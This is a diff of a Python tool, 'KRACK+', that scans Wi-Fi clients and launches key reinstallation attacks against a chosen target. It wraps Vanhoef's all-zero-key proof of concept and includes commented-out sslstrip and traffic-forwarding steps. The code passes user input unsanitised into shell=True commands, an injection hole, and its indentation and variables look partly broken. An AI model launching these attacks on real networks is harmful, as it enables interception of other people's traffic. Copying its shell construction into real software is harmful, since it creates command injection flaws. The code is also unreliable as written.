@@ -48,8 +48,7 @@ def main():
     process = subprocess.Popen(["ifconfig", "|", "sed 's/[ \t].*//;/^$/d'", "|", " awk 'FNR==4'", "|", "tr", "-d" "':"], stdout=subprocess.PIPE)
     out, err = process.communicate()
     nic_rogue = out
-    
-    
+
     # KRACK+ Attack options
     parser.add_option('--attack', '-a', default=False, help="This option will run a key reinstallation attack against ....", dest='attack', action='store_true')
     parser.add_option('--target', '-t', help="This option is used to specifiy target device using MAC-adress when running attack.", dest='target')
@@ -67,6 +66,8 @@ def main():
                       " Password length has to be 8 characters or more!", dest='password')
     parser.add_option('-d', help="This option will increase output verbosity for KRACK+ Scan", dest='debug', action='store_true')
     parser.add_option('--dd', help="This option will increase output verbosity even more for KRACK+ Scan (debugging purposes).", dest='dd', action='store_true')
+    parser.add_option('--path', '-p', help="Set path where scan report should be saved", dest='path')
+
 
     # General KRACK+ options:
     parser.add_option('--restore', '-r', help="This option will restore internet connection (wifi). Hopefully you'll never have to use this option.", dest='restore', default=False, action='store_true')
@@ -100,50 +101,53 @@ def main():
             	    scanParser() 
     
         except(KeyboardInterrupt, SystemExit):
-                log.info("Cleaning up...")
-                subprocess.call(["./restoreClientWifi.sh"])
-                log.info("Generating PDF with findings and cleaning up...")
+		subprocess.call(["clear"], shell=True)
+                log.info("Cleaning up and generating PDF report of findings...")
                 subprocess.call(["./restoreClientWifi.sh"])
                 writeResults()
-                subprocess.call("python ./genPDF.py")
+		if options.path:
+                	subprocess.call(["./genPDF.py " + options.path], shell=True)
+			log.info("PDF generated in '" + options.path + "'.")
+		else: 
+			subprocess.call("./genPDF.py")	
+			log.info("PDF generated in '" + path + "'.")
                 subprocess.call(["rm scanOutput.txt"], shell=True)
                 subprocess.call(["rm scannedMacIP.txt"], shell=True)
                 subprocess.call(["rm pairwiseVulnMacIP.txt"], shell=True)
                 subprocess.call(["rm groupVulnMacIP.txt"], shell=True)
-                log.info("PDF generated in '" + path + "'.")
+                
         except:
             log.error("Error occurred.")
-            subprocess.call(["rm scanOutput.txt"], shell=True)
-            subprocess.call(["rm scannedMacIP.txt"], shell=True)
-            subprocess.call(["rm pairwiseVulnMacIP.txt"], shell=True)
-            subprocess.call(["rm groupVulnMacIP.txt"], shell=True)
             log.info("Restoring internet connection.")
             subprocess.call(["./restoreClientWifi.sh"])
 
 
     ############# ATTACK ################
-    if options.attack and options.mon and options.rogue and options.target and options.targetSSID:
+    elif options.attack and options.mon and options.rogue and options.target and options.targetSSID and not options.scan:
         try:
             print("Performing key reinstallation attack")
             #Sets up dependencies before the attack script runs
-            subprocess.call(["./prepareClientAttack.sh"])
-
-           
+            subprocess.call(["./prepareClientAttack.sh"])         
             with open('./attackOutput.txt', 'w') as attackOutput:
+                # Subprocess runs script from Vanhoef's repository, to avoid problems with the temporary files his script creates
+                subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py " + options.rogue + " " +
+                                 options.mon + " " + options.targetSSID + " --target " + options.target + " &"], stdout=attackOutput, shell=True)
                 # Usually not necesary to cd to run a script, however Vanhoef's implementation requires it, otherwise we would have to alter his code. 
-                subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py " + options.rogue + " " + options.mon + " " + options.targetSSID + " --target " + options.target + " &"], stdout=attackOutput, shell=True)
-                # Usually not necesary to cd to run a script, however Vanhoef's implementation requires it, otherwise we would have to alter his code. 
-                subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./enable_internet_forwarding.sh &"])
-                subprocess.call(["sslstrip -w sslstrip.log &"])
+                #subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./enable_internet_forwarding.sh &"])
+                #subprocess.call(["sslstrip -w sslstrip.log &"])
             	attackParser()
+
         except KeyboardInterrupt:
+   	    subprocess.call(["clear"], shell=True)
             log.info("Cleaning up and restoring wifi ...")
 	    subprocess.call(["rm attackOutput.txt"], shell=True)
             subprocess.call(["./restoreClientWifi.sh"])
 	except:
+	    subprocess.call(["clear"], shell=True)
             log.info("Error occurred. Restoring wifi ...")
             subprocess.call(["rm attackOutput.txt"], shell=True)
             subprocess.call(["./restoreClientWifi.sh"])
+
     ############# RESTORE INTERNET ################        
     elif options.restore:
         log.debug("Restoring internet connection")
